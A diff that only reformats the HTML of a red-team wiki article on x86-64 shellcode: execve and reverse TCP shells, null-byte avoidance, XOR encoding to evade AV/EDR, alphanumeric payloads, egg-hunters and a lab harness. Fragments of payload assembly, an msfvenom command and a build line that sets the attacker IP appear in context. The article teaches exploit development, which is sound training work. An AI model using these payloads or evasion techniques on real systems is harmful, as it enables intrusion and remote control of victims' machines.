@@ -164,25 +164,10 @@
 
 				<article>
 					<h2 id="shellcode">Shellcode</h2>
-					<p>
-						Writing position-independent machine code payloads in x86-64 assembly - from first syscall to
-						reverse
-						<abbr title="Transmission Control Protocol">TCP</abbr>
-						shell with null-byte avoidance and encoding.
-					</p>
+					<p>Writing position-independent machine code payloads in x86-64 assembly - from first syscall to reverse <abbr title="Transmission Control Protocol">TCP</abbr> shell with null-byte avoidance and encoding.</p>
 					<section>
 						<h3 id="overview">Overview</h3>
-						<p>
-							Shellcode is the raw machine code an exploit runs after it hijacks a process. This article explains
-							what makes a payload position-independent and null-free, shows how to write and extract
-							<code>execve</code>
-							and reverse
-							<abbr title="Transmission Control Protocol">TCP</abbr>
-							shells in x86-64 assembly, and covers encoders,
-							alphanumeric payloads, egg-hunters, and the tools used to verify every byte. By the end you
-							can assemble a payload, extract the opcodes, run it through a harness, and explain what the
-							kernel does when it executes.
-						</p>
+						<p>Shellcode is the raw machine code an exploit runs after it hijacks a process. This article explains what makes a payload position-independent and null-free, shows how to write and extract <code>execve</code> and reverse <abbr title="Transmission Control Protocol">TCP</abbr> shells in x86-64 assembly, and covers encoders, alphanumeric payloads, egg-hunters, and the tools used to verify every byte. By the end you can assemble a payload, extract the opcodes, run it through a harness, and explain what the kernel does when it executes.</p>
 					</section>
 					<section>
 						<h3 id="required-reading">Required Reading</h3>
@@ -196,13 +181,7 @@
 					</section>
 					<section>
 						<h3 id="what-shellcode-is">What Shellcode Is</h3>
-						<p>
-							Shellcode is a string of bytes (opcodes) that represents position-independent machine code.
-							It is the payload delivered by an exploit - injected into a process's address space and executed.
-							The term "shellcode" originates from its original purpose: spawning a shell (/bin/sh). Modern
-							shellcode encompasses any payload: reverse shells, file downloads, privilege escalation stubs,
-							meterpreter stagers.
-						</p>
+						<p>Shellcode is a string of bytes (opcodes) that represents position-independent machine code. It is the payload delivered by an exploit - injected into a process's address space and executed. The term "shellcode" originates from its original purpose: spawning a shell (/bin/sh). Modern shellcode encompasses any payload: reverse shells, file downloads, privilege escalation stubs, meterpreter stagers.</p>
 						<p>Four properties define well-written shellcode:</p>
 						<table>
 							<thead>
@@ -217,8 +196,8 @@
 									<td align="center">The code cannot assume it lives at any fixed virtual address</td>
 								</tr>
 								<tr>
-									<td align="center"><b>No null bytes</b>(usually)</td>
-									<td align="center">String functions (strcpy, gets) terminate on<code>\x00</code>- your payload stops there</td>
+									<td align="center"><b>No null bytes</b> (usually)</td>
+									<td align="center">String functions (strcpy, gets) terminate on <code>\x00</code> - your payload stops there</td>
 								</tr>
 								<tr>
 									<td align="center"><b>Small size</b></td>
@@ -230,35 +209,12 @@
 								</tr>
 							</tbody>
 						</table>
-						<p>
-							Position independence means no
-							<code>call</code>
-							to absolute addresses, no
-							<code>jmp</code>
-							to hardcoded locations,
-							and no data references outside the payload body. On x86-64, instruction-pointer-relative addressing
-							solves data access; on x86-32, the classic
-							<code>call/pop</code>
-							trick recovers the instruction pointer.
-						</p>
-						<p>
-							Null-byte avoidance is payload-specific. A
-							<abbr title="Transmission Control Protocol">TCP</abbr>
-							reverse shell
-							payload sent over a socket can contain null bytes. A payload injected through
-							<code>strcpy()</code>
-							in
-							a buffer overflow cannot. Always write shellcode null-free by default - it works in both contexts.
-						</p>
+						<p>Position independence means no <code>call</code> to absolute addresses, no <code>jmp</code> to hardcoded locations, and no data references outside the payload body. On x86-64, instruction-pointer-relative addressing solves data access; on x86-32, the classic <code>call/pop</code> trick recovers the instruction pointer.</p>
+						<p>Null-byte avoidance is payload-specific. A <abbr title="Transmission Control Protocol">TCP</abbr> reverse shell payload sent over a socket can contain null bytes. A payload injected through <code>strcpy()</code> in a buffer overflow cannot. Always write shellcode null-free by default - it works in both contexts.</p>
 					</section>
 					<section>
 						<h3 id="the-first-principle-execve2">The First Principle: execve(2)</h3>
-						<p>
-							Every shellcode journey starts with one system call:
-							<code>execve(&#34;/bin/sh&#34;, NULL, NULL)</code>
-							. Here
-							is the man page signature:
-						</p>
+						<p>Every shellcode journey starts with one system call: <code>execve(&#34;/bin/sh&#34;, NULL, NULL)</code> . Here is the man page signature:</p>
 						<pre class="c">
 #include &lt;unistd.h&gt;
 int execve(const char *pathname, char *const _Nullable argv[],
@@ -282,17 +238,17 @@ int execve(const char *pathname, char *const _Nullable argv[],
 								<tr>
 									<td align="center"><code>rdi</code></td>
 									<td align="center">1st argument</td>
-									<td align="center">pointer to<code>&#34;/bin/sh\0&#34;</code></td>
+									<td align="center">pointer to <code>&#34;/bin/sh\0&#34;</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>rsi</code></td>
 									<td align="center">2nd argument</td>
-									<td align="center">pointer to<code>argv</code>array (<code>[ptr_to_string, NULL]</code>) or NULL</td>
+									<td align="center">pointer to <code>argv</code> array (<code>[ptr_to_string, NULL]</code>) or NULL</td>
 								</tr>
 								<tr>
 									<td align="center"><code>rdx</code></td>
 									<td align="center">3rd argument</td>
-									<td align="center">pointer to<code>envp</code>array or NULL</td>
+									<td align="center">pointer to <code>envp</code> array or NULL</td>
 								</tr>
 								<tr>
 									<td align="center"><code>syscall</code></td>
@@ -301,25 +257,11 @@ int execve(const char *pathname, char *const _Nullable argv[],
 								</tr>
 							</tbody>
 						</table>
-						<p>
-							The kernel looks up
-							<code>rax</code>
-							in the syscall table, copies arguments from registers, validates them,
-							and performs the
-							<code>execve</code>
-							operation - replacing the current process image with
-							<code>/bin/sh</code>
-							.
-						</p>
+						<p>The kernel looks up <code>rax</code> in the syscall table, copies arguments from registers, validates them, and performs the <code>execve</code> operation - replacing the current process image with <code>/bin/sh</code> .</p>
 					</section>
 					<section>
 						<h3 id="hand-writing-execve-shellcode-in-nasm">Hand-Writing execve Shellcode in NASM</h3>
-						<p>
-							The following assembly spawns
-							<code>/bin/sh</code>
-							with no null bytes. Each instruction is annotated with
-							why it avoids null bytes.
-						</p>
+						<p>The following assembly spawns <code>/bin/sh</code> with no null bytes. Each instruction is annotated with why it avoids null bytes.</p>
 						<pre class="x86asm">
 ; execve.nasm — Null-free execve(&#34;/bin/sh&#34;, NULL, NULL)
 ; Assemble: nasm -f elf64 execve.nasm -o execve.o
@@ -376,36 +318,8 @@ _start:
     syscall
 						</pre>
 						<h4 id="why-this-works-null-byte-audit">Why This Works - Null Byte Audit</h4>
-						<p>
-							<code>xor rsi, rsi</code>
-							encodes as
-							<code>48 31 f6</code>
-							- no
-							<code>\x00</code>
-							.
-							<code>push rsi</code>
-							is
-							<code>56</code>
-							- no
-							<code>\x00</code>
-							.
-							<code>mov rdi, 0x68732f2f6e69622f</code>
-							encodes as
-							<code>48 bf 2f 62 69 6e 2f 2f 73 68</code>
-							- the immediate contains no
-							<code>\x00</code>
-							because we chose
-							a string that packs cleanly into 8 bytes.
-						</p>
-						<p>
-							What if we wrote
-							<code>mov rdi, 0x0068732f6e69622f</code>
-							(with a leading null byte, as "/bin/sh" is 7
-							bytes)? The opcode would contain
-							<code>\x00</code>
-							and the payload would be truncated by any string-based
-							copy.
-						</p>
+						<p><code>xor rsi, rsi</code> encodes as <code>48 31 f6</code> - no <code>\x00</code> . <code>push rsi</code> is <code>56</code> - no <code>\x00</code> . <code>mov rdi, 0x68732f2f6e69622f</code> encodes as <code>48 bf 2f 62 69 6e 2f 2f 73 68</code> - the immediate contains no <code>\x00</code> because we chose a string that packs cleanly into 8 bytes.</p>
+						<p>What if we wrote <code>mov rdi, 0x0068732f6e69622f</code> (with a leading null byte, as "/bin/sh" is 7 bytes)? The opcode would contain <code>\x00</code> and the payload would be truncated by any string-based copy.</p>
 						<h4 id="string-to-immediate-converter">String-to-Immediate Converter</h4>
 						<pre class="python">
 #!/usr/bin/env python3
@@ -469,15 +383,7 @@ xxd -p execve.bin | tr -d &#39;\n&#39; | grep -o &#39;00&#39; | wc -l
 					</section>
 					<section>
 						<h3 id="the-c-test-harness">The C Test Harness</h3>
-						<p>
-							Never embed shellcode directly in a string literal and cast it - modern toolchains put
-							<code>.rodata</code>
-							in non-executable pages. Use
-							<code>mmap</code>
-							with
-							<code>PROT_READ | PROT_WRITE | PROT_EXEC</code>
-							.
-						</p>
+						<p>Never embed shellcode directly in a string literal and cast it - modern toolchains put <code>.rodata</code> in non-executable pages. Use <code>mmap</code> with <code>PROT_READ | PROT_WRITE | PROT_EXEC</code> .</p>
 						<pre class="c">
 /*
  * harness.c — Test shellcode safely with mmap RWX allocation.
@@ -572,7 +478,7 @@ strace -f ./harness 2&gt;&amp;1 | tail -20
 								</tr>
 								<tr>
 									<td align="center">3</td>
-									<td align="center"><code>dup2(2)</code>x 3</td>
+									<td align="center"><code>dup2(2)</code> x 3</td>
 									<td align="center">33</td>
 									<td align="center">Redirect stdin, stdout, stderr to socket</td>
 								</tr>
@@ -584,18 +490,7 @@ strace -f ./harness 2&gt;&amp;1 | tail -20
 								</tr>
 							</tbody>
 						</table>
-						<p>
-							Each syscall must be position-independent and null-free. The
-							<code>connect</code>
-							syscall requires a
-							<code>sockaddr_in</code>
-							structure containing the attacker's
-							<abbr title="Internet Protocol">IP</abbr>
-							and port. This structure is built
-							on the stack at runtime using
-							<code>push</code>
-							instructions.
-						</p>
+						<p>Each syscall must be position-independent and null-free. The <code>connect</code> syscall requires a <code>sockaddr_in</code> structure containing the attacker's <abbr title="Internet Protocol">IP</abbr> and port. This structure is built on the stack at runtime using <code>push</code> instructions.</p>
 						<pre class="x86asm">
 ; reverse-tcp.nasm — Null-free reverse TCP shell, x86-64 Linux
 ; Assemble and extract same workflow as execve shellcode.
@@ -718,13 +613,7 @@ _start:
     mov al, 59                ; syscall: execve
     syscall
 						</pre>
-						<p>
-							<b>Reverse TCP Configuration Script</b>
-							- change
-							<abbr title="Internet Protocol">IP</abbr>
-							/port without manual hex
-							conversion:
-						</p>
+						<p><b>Reverse TCP Configuration Script</b> - change <abbr title="Internet Protocol">IP</abbr> /port without manual hex conversion:</p>
 						<pre class="python">
 #!/usr/bin/env python3
 &#34;&#34;&#34;Generate nasm defines for reverse TCP shell configuration.&#34;&#34;&#34;
@@ -760,23 +649,8 @@ nasm -f elf64 -DIP_ADDR=0x$(python3 -c &#34;import socket; print(socket.inet_ato
 					</section>
 					<section>
 						<h3 id="shellcode-encoding-xor-obfuscation">Shellcode Encoding - XOR Obfuscation</h3>
-						<p>
-							Shellcode encoders transform the payload to bypass signature-based detection (AV/
-							<abbr title="Endpoint Detection and Response">EDR</abbr>
-							) and character restrictions (alphanumeric-only input). The simplest encoder is single-byte
-							XOR.
-						</p>
-						<p>
-							<b>How it works:</b>
-							Choose a key byte
-							<code>K</code>
-							. XOR every byte of the original shellcode with
-							<code>K</code>
-							. The encoded payload contains no recognizable opcodes. The decoder stub is prepended - it loops
-							over the encoded bytes, XORs each with
-							<code>K</code>
-							, and jumps to the decoded payload.
-						</p>
+						<p>Shellcode encoders transform the payload to bypass signature-based detection (AV/ <abbr title="Endpoint Detection and Response">EDR</abbr> ) and character restrictions (alphanumeric-only input). The simplest encoder is single-byte XOR.</p>
+						<p><b>How it works:</b> Choose a key byte <code>K</code> . XOR every byte of the original shellcode with <code>K</code> . The encoded payload contains no recognizable opcodes. The decoder stub is prepended - it loops over the encoded bytes, XORs each with <code>K</code> , and jumps to the decoded payload.</p>
 						<pre class="x86asm">
 ; xor-decoder.nasm — Decoder stub prepended to XOR-encoded shellcode.
 ; The decoder is self-contained and position-independent.
@@ -885,11 +759,7 @@ if __name__ == &#34;__main__&#34;:
 					</section>
 					<section>
 						<h3 id="alphanumeric-shellcode">Alphanumeric Shellcode</h3>
-						<p>
-							Some exploits filter input to printable ASCII only (0x20-0x7e). Alphanumeric shellcode uses
-							only bytes that map to letters, digits, and certain punctuation. This exploits that many x86
-							opcodes fall in the printable range - the trick is chaining them to produce arbitrary behavior.
-						</p>
+						<p>Some exploits filter input to printable ASCII only (0x20-0x7e). Alphanumeric shellcode uses only bytes that map to letters, digits, and certain punctuation. This exploits that many x86 opcodes fall in the printable range - the trick is chaining them to produce arbitrary behavior.</p>
 						<p>Common alphanumeric gadgets on x86-64:</p>
 						<table>
 							<thead>
@@ -901,45 +771,38 @@ if __name__ == &#34;__main__&#34;:
 							</thead>
 							<tbody>
 								<tr>
-									<td align="center"><code>P</code>(0x50)</td>
+									<td align="center"><code>P</code> (0x50)</td>
 									<td align="center"><code>push rax</code></td>
 									<td align="center">Push rax onto stack</td>
 								</tr>
 								<tr>
-									<td align="center"><code>X</code>(0x58)</td>
+									<td align="center"><code>X</code> (0x58)</td>
 									<td align="center"><code>pop rax</code></td>
 									<td align="center">Pop into rax</td>
 								</tr>
 								<tr>
-									<td align="center"><code>Z</code>(0x5a)</td>
+									<td align="center"><code>Z</code> (0x5a)</td>
 									<td align="center"><code>pop rdx</code></td>
 									<td align="center">Pop into rdx</td>
 								</tr>
 								<tr>
-									<td align="center"><code>H</code>(0x48)</td>
+									<td align="center"><code>H</code> (0x48)</td>
 									<td align="center">REX.W prefix</td>
 									<td align="center">64-bit operand size</td>
 								</tr>
 								<tr>
-									<td align="center"><code>1</code>(0x31)</td>
+									<td align="center"><code>1</code> (0x31)</td>
 									<td align="center"><code>xor r/m, r</code></td>
 									<td align="center">XOR operation</td>
 								</tr>
 								<tr>
-									<td align="center"><code>@</code>(0x40)</td>
+									<td align="center"><code>@</code> (0x40)</td>
 									<td align="center">REX prefix</td>
 									<td align="center">Extends register encoding</td>
 								</tr>
 							</tbody>
 						</table>
-						<p>
-							Msfvenom generates alphanumeric payloads with the
-							<code>x64/xor</code>
-							encoder set to alphanumeric mode.
-							Manual construction is an academic exercise - in practice, use
-							<code>msfvenom</code>
-							:
-						</p>
+						<p>Msfvenom generates alphanumeric payloads with the <code>x64/xor</code> encoder set to alphanumeric mode. Manual construction is an academic exercise - in practice, use <code>msfvenom</code> :</p>
 						<pre class="bash">
 # Alphanumeric (mixed) shellcode for x86-64
 msfvenom -p linux/x64/exec CMD=/bin/sh \
@@ -1026,11 +889,7 @@ msfconsole -q -x &#34;
 					</section>
 					<section>
 						<h3 id="the-egg-hunter-pattern">The Egg-Hunter Pattern</h3>
-						<p>
-							An egg-hunter is a small piece of shellcode that searches memory for a marker (the "egg" - typically
-							a 4-byte tag repeated twice) and jumps into the payload found after it. Used when you have a
-							tiny injection point (50 bytes) and need to execute a large payload stored elsewhere in memory.
-						</p>
+						<p>An egg-hunter is a small piece of shellcode that searches memory for a marker (the "egg" - typically a 4-byte tag repeated twice) and jumps into the payload found after it. Used when you have a tiny injection point (50 bytes) and need to execute a large payload stored elsewhere in memory.</p>
 						<pre class="x86asm">
 ; egg-hunter.nasm — Searches memory for tag &#34;EGG!&#34; repeated twice,
 ; then jumps to the payload following it.
@@ -1096,38 +955,38 @@ skip_page:
 							<tbody>
 								<tr>
 									<td align="center">Null bytes in payload</td>
-									<td align="center">Shellcode truncated after first<code>\x00</code></td>
-									<td align="center">Audit with<code>xxd \| grep 00</code>. Rewrite instructions to avoid 64-bit immediates with high zero bytes.</td>
+									<td align="center">Shellcode truncated after first <code>\x00</code></td>
+									<td align="center">Audit with <code>xxd \| grep 00</code>. Rewrite instructions to avoid 64-bit immediates with high zero bytes.</td>
 								</tr>
 								<tr>
-									<td align="center">Using<code>.data</code>section and referencing it absolutely</td>
-									<td align="center">Segfault because<code>.data</code>is at a different address in target</td>
+									<td align="center">Using <code>.data</code> section and referencing it absolutely</td>
+									<td align="center">Segfault because <code>.data</code> is at a different address in target</td>
 									<td align="center">Put all data on the stack at runtime or use RIP-relative addressing</td>
 								</tr>
 								<tr>
-									<td align="center">Forgetting<code>cdq</code>/<code>xor rdx,rdx</code>before execve</td>
+									<td align="center">Forgetting <code>cdq</code>/<code>xor rdx,rdx</code> before execve</td>
 									<td align="center">execve reads garbage as envp -> fails</td>
-									<td align="center">Always zero<code>rdx</code>before the execve syscall</td>
+									<td align="center">Always zero <code>rdx</code> before the execve syscall</td>
 								</tr>
 								<tr>
-									<td align="center"><code>push imm64</code>-> null bytes</td>
-									<td align="center"><code>push 0x0000000000000001</code>has 7 null bytes</td>
-									<td align="center">Use<code>push imm32</code>when value fits in 32 bits</td>
+									<td align="center"><code>push imm64</code> -> null bytes</td>
+									<td align="center"><code>push 0x0000000000000001</code> has 7 null bytes</td>
+									<td align="center">Use <code>push imm32</code> when value fits in 32 bits</td>
 								</tr>
 								<tr>
-									<td align="center">Not saving socket fd before<code>dup2</code>loop</td>
-									<td align="center"><code>rdi</code>gets clobbered</td>
+									<td align="center">Not saving socket fd before <code>dup2</code> loop</td>
+									<td align="center"><code>rdi</code> gets clobbered</td>
 									<td align="center">Store in a callee-saved register (r12-r15)</td>
 								</tr>
 								<tr>
-									<td align="center">Wrong byte order for IP/port in<code>sockaddr_in</code></td>
+									<td align="center">Wrong byte order for IP/port in <code>sockaddr_in</code></td>
 									<td align="center">connect() succeeds but goes to wrong IP/port</td>
-									<td align="center">Use network byte order (big-endian). Verify with Python's<code>socket.htons()</code>/<code>socket.inet_aton()</code></td>
+									<td align="center">Use network byte order (big-endian). Verify with Python's <code>socket.htons()</code>/<code>socket.inet_aton()</code></td>
 								</tr>
 								<tr>
-									<td align="center">Assuming shellcode runs in<code>.text</code></td>
+									<td align="center">Assuming shellcode runs in <code>.text</code></td>
 									<td align="center">W^X protection kills the process</td>
-									<td align="center">Use<code>mmap(PROT_RWX)</code>in harness; in real exploits, use<code>mprotect()</code>or ROP to call<code>mprotect</code></td>
+									<td align="center">Use <code>mmap(PROT_RWX)</code> in harness; in real exploits, use <code>mprotect()</code> or ROP to call <code>mprotect</code></td>
 								</tr>
 							</tbody>
 						</table>
@@ -1143,13 +1002,7 @@ strace -e trace=execve,socket,connect,dup2,write,mmap,mprotect ./harness 2&gt;&a
 strace -e trace=execve -v ./harness
 						</pre>
 						<h4 id="gdb-with-int3-breakpoint">2. GDB with <code>int3</code> Breakpoint</h4>
-						<p>
-							Insert
-							<code>int3</code>
-							(opcode
-							<code>0xCC</code>
-							) as the first byte of shellcode to break immediately:
-						</p>
+						<p>Insert <code>int3</code> (opcode <code>0xCC</code> ) as the first byte of shellcode to break immediately:</p>
 						<pre class="bash">
 # Replace first byte of payload with 0xCC
 python3 -c &#34;
@@ -1224,9 +1077,9 @@ gdb ./harness
 								</tr>
 								<tr>
 									<td align="center">Null-free zeroing</td>
-									<td align="center"><code>xor rdi, rdi</code>(3 bytes)</td>
-									<td align="center"><code>xor ebx, ebx</code>(2 bytes)</td>
-									<td align="center"><code>mov x0, xzr</code>(4 bytes, contains \x00)</td>
+									<td align="center"><code>xor rdi, rdi</code> (3 bytes)</td>
+									<td align="center"><code>xor ebx, ebx</code> (2 bytes)</td>
+									<td align="center"><code>mov x0, xzr</code> (4 bytes, contains \x00)</td>
 								</tr>
 								<tr>
 									<td align="center">Stack pointer</td>
@@ -1236,20 +1089,7 @@ gdb ./harness
 								</tr>
 							</tbody>
 						</table>
-						<p>
-							ARM64 null-byte challenge:
-							<code>mov x0, xzr</code>
-							encodes as
-							<code>0xaa1f03e0</code>
-							- no null bytes.
-							<code>mov x0, #59</code>
-							encodes as
-							<code>0xd2800760</code>
-							- also null-free. But string references require
-							<code>adr</code>
-							instruction with
-							page-relative offset, which may embed null bytes depending on alignment.
-						</p>
+						<p>ARM64 null-byte challenge: <code>mov x0, xzr</code> encodes as <code>0xaa1f03e0</code> - no null bytes. <code>mov x0, #59</code> encodes as <code>0xd2800760</code> - also null-free. But string references require <code>adr</code> instruction with page-relative offset, which may embed null bytes depending on alignment.</p>
 					</section>
 					<section>
 						<h3 id="verification-checklist">Verification Checklist</h3>
@@ -1349,11 +1189,7 @@ fi
 					</section>
 					<section>
 						<h3 id="challenge">Challenge</h3>
-						<p>
-							Write null-free shellcode, extract it, and run it inside the lab container. The container ships
-							nasm, gcc, gdb, strace, and Python so you can assemble a payload, verify that it contains no
-							null bytes, and trace the syscalls it makes.
-						</p>
+						<p>Write null-free shellcode, extract it, and run it inside the lab container. The container ships nasm, gcc, gdb, strace, and Python so you can assemble a payload, verify that it contains no null bytes, and trace the syscalls it makes.</p>
 						<p><a href="/wiki/articles/redteam/shellcode.Containerfile">shellcode.Containerfile</a></p>
 						<pre class="bash">
 podman build -t shellcode -f shellcode.Containerfile .
